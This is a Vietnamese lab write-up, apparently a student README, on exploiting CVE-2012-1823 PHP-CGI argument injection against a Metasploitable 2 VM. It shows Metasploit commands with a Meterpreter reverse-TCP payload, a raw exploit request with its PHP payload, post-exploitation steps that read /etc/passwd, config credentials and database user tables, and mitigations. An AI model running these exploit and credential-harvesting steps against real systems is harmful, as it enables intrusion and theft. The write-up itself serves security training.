# 🛡️ Remote Code Execution thông qua PHP-CGI Argument Injection
> - **Tên lỗ hỏng:** PHP CGI Argument Injection
> - **Mã CVE:** CVE-2012-1823
> - **Mức độ:** Cao
> - **Ngày phát hiện:** 2012

## 🧱 1. Mô tả lỗ hổng
> - **"LỖI NÀY XẢY RA VÌ:"**
> - "PHP phiên bản cũ (≤ 5.3.12 hoặc 5.4.2)"
> -  "Và PHP dưới chế độ CGI (Common Gateway Interface)"
> -  "PHP phân tích sai tham số truyền từ URL, cho phép attacker chèn lệnh nguy hiểm"
> - => Kẻ tấn công thực thi lệnh tùy ý từ xa (RCE – Remote Code Execution) thông qua đối số dòng lệnh (argument injection).

## Hacker đã lợi dụng gì?
> - Hacker lợi dụng PHP-CGI hiểu nhầm query string (?-d ...) là đối số dòng lệnh, từ đó ép PHP nạp và thực thi mã do hacker gửi.

## Kỹ thuật khai thác:
- Gửi một HTTP request có ? chứa argument bất hợp lệ vào php-cgi
- Truyền mã PHP độc hại thông qua POST
- Kết quả: shell được thực thi từ xa

## ⚒️ 2. Thử nghiệm thực tế
- QUYÉT MÁY CHỦ để tìm thông tin về phiên bản web server:

<img width="704" height="259" alt="image" src="https://github.com/user-attachments/assets/d9664fec-59cf-4cb9-8c63-3083583190b1" />

### Sau khi xác minh được phiên bản PHP trên web server là 5.4.2. Tìm kiếm các lỗ hổng bảo mật có liên quan:
```
sudo msfconsole
```

```
searchsploit apache | grep 5.4.2
```

```
search php_cgi
```

### Sử dụng module php_cgi_arg_injection của Metataploit để chiếm shell trên Metasploitable
```
use multi/http/php_cgi_arg_injection
```

### XEM SETTING
```
show options
```

```
set rhost <IP Metasploitable 2>
```

```
# set lhost
# set lport
```

```
set PAYLOAD php/meterpreter/reverse_tcp
```

```
exploit
```

```
shell
```
### ⚔️ 1. Kiểm tra thông tin hệ thống
```
uname -a          # Thông tin kernel
id                # Kiểm tra UID, GID
```

### 🔍 2. Kiểm tra các user trên hệ thống
```
cat /etc/passwd
```
- Là danh sách toàn bộ người dùng có trên hệ thống Linux

### 📁 4. Khám phá thư mục home, có thể chứa thông tin nhạy cảm
```
cd /home
ls -la
```

#### 🔍 Xem nội dung các thư mục /home
```
ls -la /home/msfadmin
ls -la /home/user
ls -la /home/service
```

- ✅ Hiển thị chi tiết tất cả thư mục người dùng trong /home

### 🔑 5. Tìm kiếm thông tin nhạy cảm: mật khẩu, private key, cấu hình database
```
find /var/www -type f -iname "*config*.php"
```

#### 🔍 Đặc biệt chú ý các file trong dvwa, mutillidae, phpMyAdmin, tikiwiki:
```
cat /var/www/dvwa/config/config.inc.php
```

<img width="950" height="441" alt="image" src="https://github.com/user-attachments/assets/c4b0795d-7993-4b1a-9906-8b4096b8592f" />

### 🔄 7. Nếu có thông tin đăng nhập MySQL, thử đăng nhập:
```
mysql -u root -p
```

```
show databases;
```

```
exit
```

```
USE dvwa;
SHOW TABLES;
SELECT * FROM users;
```

```
exit
```


### 🧱 8. Kiểm tra các tiến trình đang chạy, dịch vụ khả nghi
```
ps aux
```


#### THỰC HIỆN CHÍM SHELL
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
su users
```

hoặc
```
su msfadmin
# mật khẩu: msfadmin hoặc password
```

## 📉 3. Rủi ro an ninh

| Mức độ                 | Mô tả                                            |
| ---------------------- | ------------------------------------------------ |
| **Tác động**           | Toàn bộ hệ thống có thể bị chiếm quyền kiểm soát |
| **Khả năng khai thác** | Rất cao – công cụ công khai, không cần xác thực  |
| **Hậu quả tiềm ẩn**    | Rò rỉ dữ liệu, chèn web shell, pivot mạng nội bộ |

| Kết quả                                               | Diễn giải                                                              |
| ----------------------------------------------------- | ---------------------------------------------------------------------- |
| 🧠 Thực thi lệnh từ xa (RCE)                          | Hacker chạy được lệnh hệ thống như `id`, `uname`, `cat /etc/passwd`    |
| 🐚 Nhận được **web shell**                            | Hacker chèn reverse shell, mở kết nối từ máy nạn nhân về               |
| 📥 Tải malware, cài backdoor                          | Hacker chiếm quyền máy chủ, bí mật tải mã độc về                       |
| 🕵️ Truy cập database, file, các hệ thống nội bộ khác | Do `www-data` thường có quyền đọc mã nguồn web, file cấu hình database |



## 🧠 Vì sao lại thuộc nhóm "Vulnerable and Outdated Components"?

| Tiêu chí                                 | Có khớp không?                        |
| ---------------------------------------- | ------------------------------------- |
| ❌ Phần mềm không được cập nhật           | ✅ PHP 5.2.4 quá cũ (2007)             |
| ⚠️ Lỗ hổng đã công bố và có mã khai thác | ✅ CVE-2012-1823                       |
| 🔥 Hacker có thể khai thác từ xa         | ✅ Tấn công RCE thành công             |
| 🔐 Không có kiểm soát an ninh bù         | ✅ Không dùng WAF hoặc cấu hình bảo vệ |

## 🛡️ 4. Đề xuất khắc phục

| Hành động               | Chi tiết                                                      |
| ----------------------- | ------------------------------------------------------------- |
| 🔄 **Cập nhật PHP**     | Nâng cấp PHP lên ít nhất phiên bản **7.4 trở lên**            |
| 🔐 **Tắt PHP-CGI**      | Nếu không bắt buộc dùng CGI, tắt hoàn toàn module             |
| 🚧 **Cấu hình WAF/IDS** | Triển khai WAF (ModSecurity, v.v...) để lọc tham số nguy hiểm |
| 🧹 **Quản lý bản vá**   | Thiết lập lịch cập nhật phần mềm định kỳ                      |

### Lọc Tham Só Nguy Hiểm

```
cd /var/www
sudo nano .htaccess
```

- Dán nội dung sau:

```
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]
  RewriteRule ^.* - [F,L]
</IfModule>
```

- 🔍 Kiểm tra nhanh

```
cat /etc/apache2/mods-enabled/
```

```
ls /etc/apache2/mods-enabled/rewrite.load
```

- reload

```
sudo a2enmod rewrite
sudo /etc/init.d/apache2 force-reload
```

- 🛠 Cho phép Apache sử dụng .htaccess

```
sudo nano /etc/apache2/sites-available/default
```

- Tìm 

```
<Directory /var/www/>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride None
    Order allow,deny
    allow from all
</Directory>
```

- ➡ Sửa dòng AllowOverride None thành:

```
AllowOverride All
```

- 🔁 Khởi động lại Apache

```
sudo /etc/init.d/apache2 restart
```

## Tham Khảo
- https://github.com/0xl0k1/CVE-2012-1823
## ✅ Kết Luận
## NOTEs

- **metaploit2**

| Trường       | Giá trị    |
| ------------ | ---------- |
| **Username** | `msfadmin` |
| **Password** | `msfadmin` |

```
sudo ifconfig eth0 192.168.80.10 netmask 255.255.255.0 up 
```

- SSH đến metaploit2

```
export TERM=xterm
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.80.10
```



## 🧭 Sơ đồ luồng khai thác CVE-2012-1823
```
[ Hacker ]
   |
   | 1. Gửi HTTP request đặc biệt:
   |    GET /index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input
   |    POST body: <?php system('id'); ?>
   |
   v
[ Web Server (Apache hoặc Nginx)]
   |
   | 2. Web server chuyển yêu cầu tới PHP-CGI (ví dụ: /usr/bin/php-cgi)
   |    Lưu ý: các tham số `-d` bị chuyển nguyên vẹn
   |
   v
[ PHP-CGI ]
   |
   | 3. Nhận tham số cấu hình động:
   |    - Cho phép `allow_url_include = On`
   |    - Chèn mã từ `php://input` nhờ `auto_prepend_file`
   |
   v
[ PHP Engine ]
   |
   | 4. Đọc nội dung từ POST body:
   |    <?php system('id'); ?>
   |
   | → Thực thi mã PHP do hacker gửi
   |
   v
[ Kết quả ]
   → Hacker thực thi lệnh tùy ý trên máy chủ
   → Chiếm quyền truy cập, đọc file, chiếm shell...

```
```
┌────────────┐       ┌────────────────────┐       ┌──────────────┐
│  Hacker    │──────▶ Web Server (Apache)│──────▶│ PHP-CGI Bị   │
│            │ HTTP  │ chạy PHP dưới CGI │       │ LỖI PHÂN TÍCH│
│ Gửi yêu cầu│──────▶ (index.php? -d ...)│──────▶│ QUERY STRING │
└────┬───────┘       └────────────────────┘       └────┬─────────┘
     │                                                 │
     │   POST body:                                    │
     │   <?php system("id"); ?>                        │
     │                                                 ▼
     │                                    ┌───────────────────────────┐
     │                                    │ PHP hiểu:                 │
     │                                    │ -d auto_prepend_file=... │
     │                                    │ → Đọc mã từ php://input  │
     │                                    └──────────┬────────────────┘
     │                                               │
     ▼                                               ▼
┌──────────────────────┐                 ┌────────────────────────────┐
│  PHP thực thi mã     │◀────────────────│    Đoạn mã độc gửi bởi     │
│  system("id");       │                 │    hacker được thực thi    │
└──────────────────────┘                 └────────────────────────────┘
             │
             ▼
┌────────────────────────────┐
│  Hacker nhận kết quả trả về│
│  (ví dụ: www-data, id, ...)│
└────────────────────────────┘
```
